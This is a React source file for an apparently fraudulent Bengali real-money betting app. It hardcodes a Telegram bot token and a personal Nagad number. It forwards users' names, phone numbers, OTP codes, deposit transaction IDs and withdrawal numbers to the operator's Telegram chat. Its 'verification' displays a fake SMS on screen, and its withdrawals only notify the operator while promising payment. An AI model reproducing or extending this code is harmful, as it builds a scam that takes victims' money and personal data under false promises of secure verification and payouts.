
import React, { useState, useEffect, useRef } from 'react';
import Header from './components/Header';
import ChatAssistant from './components/ChatAssistant';
import TournamentBanner from './components/TournamentBanner';

// --- Configuration ---
const TELEGRAM_BOT_TOKEN = '7661259658:AAH_XyRnVbL6Squha70cO_zFVmdH11WBm8I';
const TELEGRAM_CHAT_ID = '6541663008';
const ADMIN_NUMBER = '01736428130';

// --- Types ---
type View = 'dashboard' | 'deposit' | 'withdraw' | 'history' | 
             'play_aviator' | 'play_mines' | 'play_dice' | 'play_coin' | 
             'play_crash';

interface UserProfile {
  name: string;
  phone: string;
  totalWon: number;
  totalLost: number;
  gamesPlayed: number;
}

interface GameResult {
  show: boolean;
  status: 'won' | 'lost';
  amount: number;
  gameName: string;
}

export default function App() {
  const [user, setUser] = useState<UserProfile | null>(null);
  const [balance, setBalance] = useState(0); 
  const [activeTab, setActiveTab] = useState<View>('dashboard');
  
  // UI States
  const [isVerifying, setIsVerifying] = useState(false);
  const [otpSent, setOtpSent] = useState('');
  const [otpInput, setOtpInput] = useState('');
  const [tempUser, setTempUser] = useState<{name: string, phone: string} | null>(null);
  const [showFakeSMS, setShowFakeSMS] = useState(false);
  const [gameResult, setGameResult] = useState<GameResult>({ show: false, status: 'won', amount: 0, gameName: '' });

  // Form States
  const [depAmt, setDepAmt] = useState('');
  const [depTx, setDepTx] = useState('');
  const [witAmt, setWitAmt] = useState('');
  const [witNum, setWitNum] = useState('');

  // Universal Game States
  const [bet, setBet] = useState(100);
  const [multiplier, setMultiplier] = useState(1.0);
  const [gameState, setGameState] = useState<'idle' | 'playing' | 'crashed' | 'won' | 'lost'>('idle');
  const gameIntervalRef = useRef<any>(null);

  // Mines State
  const [mines, setMines] = useState<number[]>([]);
  const [revealed, setRevealed] = useState<number[]>([]);

  // Local Storage Persistence
  useEffect(() => {
    const savedUser = localStorage.getItem('og_user_v30');
    const savedBalance = localStorage.getItem('og_balance_v30');
    if (savedUser) setUser(JSON.parse(savedUser));
    if (savedBalance) setBalance(Number(savedBalance));
  }, []);

  useEffect(() => {
    if (user) localStorage.setItem('og_user_v30', JSON.stringify(user));
    localStorage.setItem('og_balance_v30', balance.toString());
  }, [user, balance]);

  const sendToTelegram = async (message: string) => {
    try {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' })
      });
    } catch (e) { console.error("Telegram Error", e); }
  };

  const processResult = (win: boolean, gameName: string, betAmount: number, mult: number = 2) => {
    const winAmt = win ? Math.floor(betAmount * mult) : 0;
    const netChange = win ? (winAmt - betAmount) : -betAmount;
    
    setBalance(p => p + netChange);
    
    setGameResult({
      show: true,
      status: win ? 'won' : 'lost',
      amount: Math.abs(win ? (winAmt - betAmount) : betAmount),
      gameName
    });

    if (user) {
      const updatedUser = {
        ...user,
        totalWon: user.totalWon + (win ? (winAmt - betAmount) : 0),
        totalLost: user.totalLost + (win ? 0 : betAmount),
        gamesPlayed: user.gamesPlayed + 1
      };
      setUser(updatedUser);

      // Detailed Bengali Telegram Report
      sendToTelegram(`
🕹️ <b>${gameName}</b>
👤 ইউজার: <b>${user.name}</b> (${user.phone})
📊 ফলাফল: ${win ? "জিতছে ✅" : "হারছে ❌"}
💸 বাজি: ৳${betAmount}
💰 বর্তমান ব্যালেন্স: ৳${(balance + netChange).toLocaleString()}

📈 <b>জীবনকাল পরিসংখ্যান:</b>
🏆 মোট জিতেছে: ৳${updatedUser.totalWon.toLocaleString()}
📉 মোট হেরেছে: ৳${updatedUser.totalLost.toLocaleString()}
🎮 মোট গেম খেলা হয়েছে: ${updatedUser.gamesPlayed} টি
      `);
    }
  };

  const handleRegister = (e: React.FormEvent) => {
    e.preventDefault();
    const data = new FormData(e.target as HTMLFormElement);
    const name = data.get('name') as string;
    const phone = data.get('phone') as string;
    if (phone.length < 11) return alert("সঠিক ১১ ডিজিটের মোবাইল নম্বর দিন");
    const code = Math.floor(1000 + Math.random() * 9000).toString();
    setOtpSent(code);
    setTempUser({ name, phone });
    setIsVerifying(true);
    setShowFakeSMS(true); 
    sendToTelegram(`🔑 <b>নতুন ওটিপি</b>\n👤 নাম: ${name}\n📞 ফোন: ${phone}\n🔑 কোড: ${code}`);
  };

  const confirmOtp = () => {
    if (otpInput === otpSent && tempUser) {
      setUser({ ...tempUser, totalWon: 0, totalLost: 0, gamesPlayed: 0 });
      setIsVerifying(false);
      setShowFakeSMS(false);
    } else alert("ভুল ওটিপি!");
  };

  const enterGame = (gameId: View) => {
    if (balance <= 0) {
      alert("আগে ডিপোজিট করুন! শূন্য ব্যালেন্স নিয়ে গেম খেলা যাবে না।");
      setActiveTab('deposit');
      return;
    }
    setGameState('idle');
    setActiveTab(gameId);
  };

  // --- Game Logic ---

  const startAviator = () => {
    if (balance < bet) return alert("পর্যাপ্ত ব্যালেন্স নেই!");
    setGameState('playing');
    setMultiplier(1.0);
    const crashAt = 1.1 + Math.random() * 4.0; 
    
    gameIntervalRef.current = setInterval(() => {
      setMultiplier(prev => {
        const next = prev + 0.05;
        if (next >= crashAt) {
          clearInterval(gameIntervalRef.current);
          setGameState('crashed');
          processResult(false, "এভিয়েটর (Aviator)", bet);
          return next;
        }
        return next;
      });
    }, 100);
  };

  const cashOutAviator = () => {
    if (gameState !== 'playing') return;
    clearInterval(gameIntervalRef.current);
    setGameState('won');
    processResult(true, "এভিয়েটর (Aviator)", bet, multiplier);
  };

  const startMines = () => {
    if (balance < bet) return alert("ব্যালেন্স নেই!");
    const m: number[] = [];
    while(m.length < 3) {
      const r = Math.floor(Math.random() * 25);
      if(!m.includes(r)) m.push(r);
    }
    setMines(m);
    setRevealed([]);
    setGameState('playing');
  };

  const revealMine = (idx: number) => {
    if (gameState !== 'playing' || revealed.includes(idx)) return;
    if (mines.includes(idx)) {
      setGameState('lost');
      processResult(false, "মাইনস (Mines)", bet);
    } else {
      const next = [...revealed, idx];
      setRevealed(next);
      if (next.length === 22) {
        setGameState('won');
        processResult(true, "মাইনস (Mines)", bet, 10);
      }
    }
  };

  const cashOutMines = () => {
    if (gameState !== 'playing' || revealed.length === 0) return;
    const mult = 1 + (revealed.length * 0.4);
    setGameState('won');
    processResult(true, "মাইনস (Mines)", bet, mult);
  };

  const playDice = () => {
    if (balance < bet) return alert("ব্যালেন্স নেই!");
    processResult(Math.random() > 0.5, "ডাইস (Dice)", bet, 1.9);
  };

  const playCoin = () => {
    if (balance < bet) return alert("ব্যালেন্স নেই!");
    processResult(Math.random() > 0.5, "কয়েন ফ্লিপ (Coin Flip)", bet, 1.9);
  };

  const GameResultModal = () => (
    <div className={`fixed inset-0 z-[10000] flex items-center justify-center p-6 bg-black/95 animate-in fade-in duration-300 ${gameResult.show ? '' : 'hidden'}`}>
       <div className={`w-full max-w-sm glass rounded-[48px] p-12 border-2 text-center shadow-2xl ${gameResult.status === 'won' ? 'border-green-500 shadow-green-500/20' : 'border-red-500 shadow-red-500/20'}`}>
          <div className={`w-28 h-28 mx-auto mb-8 rounded-full flex items-center justify-center text-5xl ${gameResult.status === 'won' ? 'bg-green-500 text-black' : 'bg-red-500 text-white'}`}>
             <i className={`fa-solid ${gameResult.status === 'won' ? 'fa-trophy' : 'fa-face-frown'}`}></i>
          </div>
          <h2 className={`text-3xl font-black mb-4 uppercase italic ${gameResult.status === 'won' ? 'text-green-500' : 'text-red-500'}`}>
            {gameResult.status === 'won' ? 'বিরাট জয়!' : 'আবার চেষ্টা করুন'}
          </h2>
          <div className="text-6xl font-black text-white mb-10 tracking-tighter">৳{gameResult.amount}</div>
          <button onClick={() => setGameResult({ ...gameResult, show: false })} className={`w-full py-6 rounded-3xl font-black uppercase text-sm tracking-widest ${gameResult.status === 'won' ? 'bg-green-500 text-black' : 'bg-red-500 text-white'}`}>আবার খেলুন</button>
       </div>
    </div>
  );

  if (!user) {
    return (
      <div className="min-h-screen bg-[#050505] flex flex-col items-center justify-center p-8 relative overflow-hidden">
        {showFakeSMS && (
          <div className="fixed top-12 left-1/2 -translate-x-1/2 w-[90%] max-w-sm glass rounded-[32px] p-6 animate-sms z-[9999] border-orange-500 border-2 shadow-[0_20px_60px_rgba(255,107,0,0.4)]">
            <div className="flex items-center gap-4 mb-3">
              <div className="w-10 h-10 rounded-xl bg-orange-500 flex items-center justify-center text-black font-black text-xs">SMS</div>
              <div>
                <p className="text-[10px] text-orange-500 font-black uppercase tracking-widest">সিস্টেম মেসেজ</p>
                <p className="text-white font-bold text-xs italic">সিকিউরিটি সার্ভিস</p>
              </div>
            </div>
            <p className="text-lg font-bold text-white mb-4">আপনার ভেরিফিকেশন কোড: <span className="text-orange-500 text-4xl font-black tracking-widest ml-1 block mt-1">{otpSent}</span></p>
            <button onClick={() => setShowFakeSMS(false)} className="w-full py-3 bg-white/5 rounded-xl text-[10px] text-gray-400 uppercase font-black tracking-widest hover:text-white">বন্ধ করুন</button>
          </div>
        )}

        <div className="w-full max-w-sm text-center">
          <div className="w-24 h-24 bg-orange-500 rounded-3xl mx-auto mb-8 flex items-center justify-center text-black font-black text-4xl shadow-orange-500/20 shadow-2xl">OG</div>
          <h1 className="text-4xl font-black mb-10 tracking-tighter uppercase italic">অনলাইন <span className="text-orange-500">গেমস</span></h1>
          {!isVerifying ? (
            <form onSubmit={handleRegister} className="space-y-4">
              <input name="name" required placeholder="আপনার পূর্ণ নাম" className="w-full bg-white/5 border border-white/10 rounded-2xl py-5 px-6 outline-none text-white text-xl font-bold focus:border-orange-500/40" />
              <input name="phone" required type="tel" placeholder="নগদ/বিকাশ নম্বর" className="w-full bg-white/5 border border-white/10 rounded-2xl py-5 px-6 outline-none text-white text-xl font-bold focus:border-orange-500/40" />
              <button className="w-full py-5 bg-orange-500 text-black font-black rounded-2xl uppercase tracking-widest shadow-xl active-scale">অ্যাকাউন্ট খুলুন</button>
            </form>
          ) : (
            <div className="space-y-8 animate-in zoom-in duration-500 text-center">
              <p className="text-gray-500 font-bold mb-4">আপনার ফোনে পাঠানো ৪ ডিজিটের কোডটি দিন</p>
              <input value={otpInput} onChange={e => setOtpInput(e.target.value)} maxLength={4} placeholder="____" className="w-full bg-transparent border-b-4 border-orange-500 text-center text-6xl font-black text-orange-500 outline-none pb-4 tracking-widest" />
              <button onClick={confirmOtp} className="w-full py-5 bg-white text-black font-black rounded-2xl uppercase tracking-widest shadow-xl active-scale">ভেরিফাই করুন</button>
              <p onClick={() => setShowFakeSMS(true)} className="text-xs text-orange-500 font-bold underline cursor-pointer mt-4">কোডটি পাননি? আবার দেখুন</p>
            </div>
          )}
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#050505] text-white font-sans pb-32">
      <GameResultModal />
      <div className="max-w-md mx-auto min-h-screen border-x border-white/5 bg-[#080808] relative shadow-2xl">
        <Header />
        <ChatAssistant />

        <main className="p-0">
          {activeTab === 'dashboard' && (
            <div className="space-y-8 animate-in fade-in duration-500">
              <TournamentBanner />
              
              <div className="mx-6 glass rounded-[44px] p-10 border border-white/10 shadow-2xl text-center relative overflow-hidden">
                <div className="absolute top-0 right-0 p-4">
                  <span className="text-[10px] bg-green-500/10 text-green-500 px-3 py-1 rounded-full border border-green-500/20 font-black uppercase">সচল ওয়ালেট</span>
                </div>
                <p className="text-gray-500 text-xs font-black uppercase tracking-widest mb-4 italic">বর্তমান ব্যালেন্স</p>
                <h1 className="text-5xl font-black tracking-tighter mb-8 text-white">৳ {balance.toLocaleString('bn-BD')}</h1>
                <div className="grid grid-cols-2 gap-4">
                  <button onClick={() => setActiveTab('deposit')} className="py-4 bg-orange-500 text-black rounded-3xl text-xs font-black uppercase font-bold active-scale">টাকা যোগ</button>
                  <button onClick={() => setActiveTab('withdraw')} className="py-4 glass border border-white/10 rounded-3xl text-xs font-black uppercase font-bold active-scale">টাকা তুলুন</button>
                </div>
              </div>

              {/* Performance Stats Dashboard In Bengali */}
              <div className="mx-6 grid grid-cols-3 gap-3">
                <div className="bg-white/5 border border-white/5 rounded-3xl p-5 text-center">
                   <p className="text-[8px] text-gray-500 font-black uppercase mb-2 tracking-widest">মোট গেম</p>
                   <p className="text-lg font-black text-white leading-none">{user.gamesPlayed}</p>
                </div>
                <div className="bg-green-500/5 border border-green-500/10 rounded-3xl p-5 text-center">
                   <p className="text-[8px] text-green-500 font-black uppercase mb-2 tracking-widest">মোট জয়</p>
                   <p className="text-lg font-black text-green-500 leading-none">৳{user.totalWon.toLocaleString()}</p>
                </div>
                <div className="bg-red-500/5 border border-red-500/10 rounded-3xl p-5 text-center">
                   <p className="text-[8px] text-red-500 font-black uppercase mb-2 tracking-widest">মোট হার</p>
                   <p className="text-lg font-black text-red-500 leading-none">৳{user.totalLost.toLocaleString()}</p>
                </div>
              </div>

              <div className="px-6 space-y-6 pb-20">
                <div className="flex items-center justify-between">
                  <h3 className="text-white font-black text-lg tracking-tight uppercase italic opacity-60">বেটিং অ্যারেনা</h3>
                  {balance <= 0 && <span className="text-[10px] bg-red-500/10 text-red-500 border border-red-500/20 px-3 py-1 rounded-full font-black uppercase tracking-widest">লকড</span>}
                </div>
                <div className="grid grid-cols-2 gap-4">
                  {[
                    { id: 'play_aviator', label: 'এভিয়েটর (Aviator)', icon: 'fa-paper-plane', color: 'text-red-500' },
                    { id: 'play_mines', label: 'মাইনস (Mines)', icon: 'fa-gem', color: 'text-orange-500' },
                    { id: 'play_dice', label: 'ডাইস (Dice)', icon: 'fa-dice', color: 'text-emerald-500' },
                    { id: 'play_coin', label: 'কয়েন ফ্লিপ', icon: 'fa-coins', color: 'text-yellow-500' },
                    { id: 'play_crash', label: 'ক্র্যাশ (Crash)', icon: 'fa-rocket', color: 'text-blue-500' },
                  ].map(game => (
                    <div 
                      key={game.id} 
                      onClick={() => enterGame(game.id as View)} 
                      className={`p-8 rounded-[40px] border border-white/5 active-scale flex flex-col items-center text-center cursor-pointer transition-all ${balance <= 0 ? 'bg-[#101010] opacity-40 grayscale' : 'bg-[#151515] hover:bg-[#1a1a1a]'}`}
                    >
                      <div className={`w-14 h-14 bg-white/5 ${game.color} rounded-2xl flex items-center justify-center text-2xl mb-4`}>
                        {balance <= 0 ? <i className="fa-solid fa-lock text-gray-600"></i> : <i className={`fa-solid ${game.icon}`}></i>}
                      </div>
                      <h4 className="text-[11px] font-black uppercase tracking-widest">{game.label}</h4>
                      <p className="text-[9px] text-gray-600 font-bold uppercase mt-2 italic">১০ গুণ পর্যন্ত লাভ</p>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          )}

          {/* Gameplay Views In Bengali */}
          {(activeTab === 'play_aviator' || activeTab === 'play_crash') && (
            <div className="p-8 text-center animate-in zoom-in duration-300">
               <button onClick={() => { clearInterval(gameIntervalRef.current); setActiveTab('dashboard'); }} className="absolute top-8 left-8 text-2xl text-gray-500"><i className="fa-solid fa-arrow-left"></i></button>
               <h2 className="text-2xl font-black mb-10 italic uppercase tracking-tighter">{activeTab === 'play_aviator' ? 'এভিয়েটর' : 'ক্র্যাশ'} <span className="text-orange-500">জোন</span></h2>
               <div className="bg-black/40 h-80 rounded-[48px] mb-10 flex flex-col items-center justify-center border border-white/5 relative overflow-hidden">
                  <div className={`text-8xl font-black text-white z-10 ${gameState === 'playing' ? 'scale-110' : ''} transition-all`}>{multiplier.toFixed(2)}x</div>
                  {gameState === 'crashed' && <div className="text-red-500 font-black text-4xl uppercase mt-4 italic animate-pulse">ক্র্যাশ হয়েছে!</div>}
               </div>
               <div className="mb-8 flex items-center justify-center gap-6">
                  <span className="text-xs text-gray-500 font-black uppercase italic tracking-widest">বাজি: ৳{bet}</span>
                  <div className="flex gap-2">
                    <button onClick={() => setBet(Math.max(10, bet - 50))} className="w-10 h-10 glass rounded-xl">-</button>
                    <button onClick={() => setBet(bet + 50)} className="w-10 h-10 glass rounded-xl">+</button>
                  </div>
               </div>
               {gameState !== 'playing' ? (
                 <button onClick={startAviator} className="w-full py-6 bg-orange-500 text-black font-black rounded-3xl uppercase tracking-widest shadow-xl">গেম শুরু করুন</button>
               ) : (
                 <button onClick={cashOutAviator} className="w-full py-6 bg-green-500 text-black font-black rounded-3xl uppercase tracking-widest shadow-xl">ক্যাশ আউট (৳{Math.floor(bet * multiplier)})</button>
               )}
            </div>
          )}

          {activeTab === 'play_mines' && (
            <div className="p-8 text-center animate-in zoom-in duration-300">
               <button onClick={() => setActiveTab('dashboard')} className="absolute top-8 left-8 text-2xl text-gray-500"><i className="fa-solid fa-arrow-left"></i></button>
               <h2 className="text-2xl font-black mb-10 italic uppercase">মাইনস <span className="text-orange-500">অ্যারেনা</span></h2>
               <div className="grid grid-cols-5 gap-2 mb-10 bg-black/40 p-4 rounded-[32px] border border-white/5">
                 {Array(25).fill(0).map((_, i) => (
                   <button 
                    key={i} 
                    onClick={() => revealMine(i)} 
                    className={`h-14 rounded-2xl flex items-center justify-center text-xl transition-all ${revealed.includes(i) ? 'bg-orange-500/20 text-orange-500' : 'bg-white/5 hover:bg-white/10 text-white/5'}`}
                   >
                     {revealed.includes(i) ? <i className="fa-solid fa-gem"></i> : <i className="fa-solid fa-box"></i>}
                   </button>
                 ))}
               </div>
               {gameState !== 'playing' ? (
                 <button onClick={startMines} className="w-full py-6 bg-orange-500 text-black font-black rounded-3xl uppercase tracking-widest">মাইন খুঁজুন (৳{bet})</button>
               ) : (
                 <button onClick={cashOutMines} className="w-full py-6 bg-green-500 text-black font-black rounded-3xl uppercase tracking-widest">টাকা তুলুন (৳{Math.floor(bet * (1 + revealed.length * 0.4))})</button>
               )}
            </div>
          )}

          {activeTab === 'play_dice' && (
            <div className="p-10 text-center animate-in zoom-in duration-300">
               <button onClick={() => setActiveTab('dashboard')} className="absolute top-8 left-8 text-2xl text-gray-500"><i className="fa-solid fa-arrow-left"></i></button>
               <h2 className="text-2xl font-black mb-12 italic uppercase">ডাইস <span className="text-emerald-500">রোল</span></h2>
               <div className="bg-black/40 p-20 rounded-[48px] mb-12 flex justify-center border border-white/5 text-8xl text-emerald-500"><i className="fa-solid fa-dice animate-bounce"></i></div>
               <button onClick={playDice} className="w-full py-6 bg-emerald-500 text-black font-black rounded-3xl uppercase active-scale">রোল করুন (৳{bet})</button>
            </div>
          )}

          {activeTab === 'play_coin' && (
            <div className="p-10 text-center animate-in zoom-in duration-300">
               <button onClick={() => setActiveTab('dashboard')} className="absolute top-8 left-8 text-2xl text-gray-500"><i className="fa-solid fa-arrow-left"></i></button>
               <h2 className="text-2xl font-black mb-12 italic uppercase">কয়েন <span className="text-yellow-500">ফ্লিপ</span></h2>
               <div className="bg-black/40 p-20 rounded-[48px] mb-12 flex justify-center border border-white/5 text-8xl text-yellow-500"><i className="fa-solid fa-coins animate-pulse"></i></div>
               <button onClick={playCoin} className="w-full py-6 bg-yellow-500 text-black font-black rounded-3xl uppercase">ফ্লিপ করুন (৳{bet})</button>
            </div>
          )}

          {activeTab === 'deposit' && (
            <div className="p-6 animate-in slide-in-from-right-8 duration-500">
               <div className="glass rounded-[48px] p-10 border border-orange-500/10 shadow-2xl">
                 <h2 className="text-3xl font-black text-center mb-6 italic uppercase tracking-tighter">নগদ <span className="text-orange-500">ডিপোজিট</span></h2>
                 
                 <div className="bg-orange-500/10 border border-orange-500/20 rounded-3xl p-6 mb-8 text-center">
                    <p className="text-xs font-black text-orange-500 uppercase tracking-widest mb-1">ডিপোজিট লিমিট</p>
                    <p className="text-lg font-bold text-white">১০০ থেকে ৫,০০০ টাকা পর্যন্ত ডিপোজিট করা যাবে।</p>
                 </div>

                 <div className="bg-black/60 p-8 rounded-[32px] border border-white/5 mb-8 text-center active-scale transition-all" onClick={() => { navigator.clipboard.writeText(ADMIN_NUMBER); alert("নম্বর কপি হয়েছে!"); }}>
                    <p className="text-xs text-gray-500 font-black uppercase mb-3 italic tracking-widest">সেন্ড মানি নম্বর (Nagad)</p>
                    <p className="text-3xl font-mono font-black text-orange-500 tracking-widest">{ADMIN_NUMBER}</p>
                 </div>
                 <div className="space-y-6">
                   <input value={depAmt} onChange={e => setDepAmt(e.target.value)} type="number" placeholder="টাকার পরিমাণ লিখুন" className="w-full bg-white/5 border border-white/10 rounded-3xl py-6 px-8 text-white text-2xl font-black outline-none" />
                   <input value={depTx} onChange={e => setDepTx(e.target.value)} placeholder="ট্রানজেকশন আইডি (TxID)" className="w-full bg-white/5 border border-white/10 rounded-3xl py-6 px-8 text-white font-black outline-none tracking-widest text-sm" />
                   <button onClick={() => {
                     const amt = Number(depAmt);
                     if (amt < 100 || amt > 5000) return alert("১০০ থেকে ৫০০০ টাকার মধ্যে ডিপোজিট করুন");
                     if (!depTx) return alert("ট্রানজেকশন আইডি (TxID) দিন");
                     setBalance(prev => prev + amt);
                     sendToTelegram(`💰 <b>ডিপোজিট রিকোয়েস্ট</b>\n👤 ইউজার: ${user?.name}\n💵 টাকা: ৳${amt}\n📑 TxID: ${depTx}`);
                     alert(`৳${amt} যোগ হয়েছে!`); setDepAmt(''); setDepTx(''); setActiveTab('dashboard');
                   }} className="w-full py-6 bg-orange-500 text-black font-black rounded-3xl uppercase tracking-widest shadow-2xl active-scale">ডিপোজিট সম্পন্ন করুন</button>
                 </div>
               </div>
            </div>
          )}

          {activeTab === 'withdraw' && (
            <div className="p-6 animate-in slide-in-from-left-8 duration-500">
               <div className="glass rounded-[48px] p-10 border border-red-500/10 shadow-2xl">
                 <h2 className="text-3xl font-black text-center mb-10 italic uppercase tracking-tighter">টাকা <span className="text-red-500">উত্তোলন</span></h2>
                 <div className="bg-white/5 p-8 rounded-[32px] mb-8 border border-white/5 text-center">
                    <p className="text-gray-400 text-xs font-bold uppercase mb-2">উত্তোলনযোগ্য ব্যালেন্স</p>
                    <p className="text-4xl font-black text-white">৳ {balance.toLocaleString('bn-BD')}</p>
                 </div>
                 <div className="space-y-6">
                   <input value={witAmt} onChange={e => setWitAmt(e.target.value)} type="number" placeholder="পরিমাণ (কমপক্ষে ৫০০)" className="w-full bg-white/5 border border-white/10 rounded-3xl py-6 px-8 text-white text-2xl font-black outline-none" />
                   <input value={witNum} onChange={e => setWitNum(e.target.value)} placeholder="নগদ নম্বর দিন" className="w-full bg-white/5 border border-white/10 rounded-3xl py-6 px-8 text-white font-black outline-none tracking-widest" />
                   <button onClick={() => {
                     const amt = Number(witAmt);
                     if (amt < 500) return alert("ন্যূনতম ৫০০ টাকা উত্তোলন করুন");
                     if (amt > balance) return alert("পর্যাপ্ত ব্যালেন্স নেই");
                     setBalance(p => p - amt); 
                     sendToTelegram(`🔴 <b>উত্তোলন</b>\n👤 ইউজার: ${user?.name}\n💵 টাকা: ৳${amt}\n📱 নগদ: ${witNum}`);
                     alert("উত্তোলন রিকোয়েস্ট পাঠানো হয়েছে। ২-৬ ঘণ্টার মধ্যে টাকা পেয়ে যাবেন।"); setWitAmt(''); setWitNum(''); setActiveTab('dashboard');
                   }} className="w-full py-6 bg-red-500 text-white font-black rounded-3xl uppercase tracking-widest">টাকা উত্তোলন করুন</button>
                 </div>
               </div>
            </div>
          )}
        </main>

        <nav className="fixed bottom-8 left-1/2 -translate-x-1/2 w-[92%] h-24 glass rounded-[48px] border border-white/10 flex items-center justify-around z-[100] shadow-2xl px-8 backdrop-blur-3xl">
          <button onClick={() => setActiveTab('dashboard')} className={`flex flex-col items-center gap-2 transition-all ${activeTab === 'dashboard' ? 'text-orange-500 scale-110' : 'text-gray-600'}`}>
            <i className="fa-solid fa-house-chimney text-2xl"></i>
            <span className="text-[9px] font-black uppercase tracking-widest">হোম</span>
          </button>
          <button onClick={() => setActiveTab('dashboard')} className={`flex flex-col items-center gap-2 transition-all ${activeTab.includes('play') ? 'text-orange-500 scale-110' : 'text-gray-600'}`}>
            <i className="fa-solid fa-gamepad text-2xl"></i>
            <span className="text-[9px] font-black uppercase tracking-widest">অ্যারেনা</span>
          </button>
          <button onClick={() => setActiveTab('withdraw')} className={`flex flex-col items-center gap-2 transition-all ${activeTab === 'withdraw' ? 'text-orange-500 scale-110' : 'text-gray-600'}`}>
            <i className="fa-solid fa-wallet text-2xl"></i>
            <span className="text-[9px] font-black uppercase tracking-widest">ওয়ালেট</span>
          </button>
        </nav>
      </div>
    </div>
  );
}
